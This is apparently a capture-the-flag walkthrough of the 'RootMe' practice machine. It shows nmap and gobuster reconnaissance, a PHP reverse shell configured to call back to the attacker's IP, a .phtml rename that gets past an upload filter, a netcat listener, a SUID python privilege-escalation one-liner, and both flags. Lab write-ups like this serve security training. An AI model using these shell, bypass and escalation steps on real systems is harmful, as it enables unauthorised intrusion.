Walkthrough
This room contains 4 tasks, with the exception of task 1, each task has 1 more questions to answer.
Task 1: Deplpoy the machine
Task 2: Reconnaissance
	-Scan the machine, how many ports are open?
	-What version of Apache is running?
	-What service is running on port 22?
	-Find directories on the web server using the gobuster tool. What is the hidden directory?
Task 3: Getting a shell
	-user.txt (what is the flag?)
Task 4: Priviledge escalation
	-Search for files with SUID permission, which file is weird?
	-Find a form to escalate  your privileges
	-root.txt (what is the flag?)


To start this ctf I will open up my terminal and perform an nmap scan on the target.
	nmap 10.10.98.115 -A -T4

This gave me the following relevent results.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:

|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home

Using this information I am able to to answer the first 3 questions of Task 2.
	-How many ports are open? 2
	-What version of Apache is running? 2.4.29
	-What service is running on port 22? ssh


I opened the page in my browser.  There is a black screen with large white letters saying "root@rootme:~#|" with smaller letters
below saying 'Can you root me?"  I viewed the page source but nothing stood out to me.

Next I went back to my terminal to use gobuster. 
root@ip-10-10-235-140:~# gobuster dir -u 10.10.98.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Progress: 218275 / 218276 (100.00%)

Using these results I was able to answer the final question of task 2.
	-What is the hidden directory? /panel/

Next I went back to my browser and visited the /panel/ drectory.  It brought me to a file upload form.
Knowing the next task required me to get a shell uploaded onto the server I went to github and downloaded the
pentester monkey reverse shell script.  Its a commonly used reverse shell.
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

The only modification I made to the script was to change the ip address of the listening machine
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.235.140';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

Next I used netcat to create a port listener.

root@ip-10-10-235-140:~/Desktop# nc -lvnp 1234
Listening on 0.0.0.0 1234

I attempt to upload the shell but the .php file extension is not permitted.
So not really expecting it to work I changed the filename from
shell.php to shell.php.jpg and was able to upload the file. 
Had that failed, I was going to use burp suite to test file exensions.

I go to /uploads/ directory to confirm that the shell was uploaded and it had been.
I click on the shell.php.jpg file in the directory and the following text appears on screen.
The image "http://10.10.98.115/uploads/shell.php.jpg" cannot be displayed because it contains errors.

Despite my previus claim that I would use burp suite next, I decided to try a few more .php file extension alternatives first.
So I changed the filename to shell.phtml and reuploaded it.  It was successful.  I went to the uploads directory and found the
upload. I clicked on it and -insert Mr Robot voice- I'm in.

root@ip-10-10-235-140:~/Desktop# nc -lvnp 1234

And then my attackbox crashed.

After restarting my atatckbox I got a new shell on the system.  I looked around the file system for a few minutes before using the find command
to locate the user.txt file and then open it to find the fiag.
$ cat /var/www/user.txt
	-user.txt(what is the flag?) THM{y0u_g0t_a_sh3ll}

The final task is to escelate my privileges on the machine.
First, I run the command find /-user root -perm /4000 and check the files to see which one stands out.
Unfortunately none of the files I could see in my terminal were correct and for whatever reason the terminal in the attackbox would not allow
me to scroll up enough to view all of the results from the command.  I was forced to google the answer.

	-Search for files with the SUID permission, which file feels weird? /usr/bin/pythom

Next I went to the gtf website and went to the suid section under python
https://gtfobins.github.io/gtfobins/python/#suid

I found the following command 

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

Once I ran that command, I was elevated to root.  I used
find -name root.txt to find the answer to the final question.

	-root.txt (what is the flag?) THM{pr1v1l3g3_3sc4l4t10n}

This was a faily straight forward and simple ctf.  It was unfornate that I had to use outside help to find one of the answers, but thats just how these things
go sometimes.
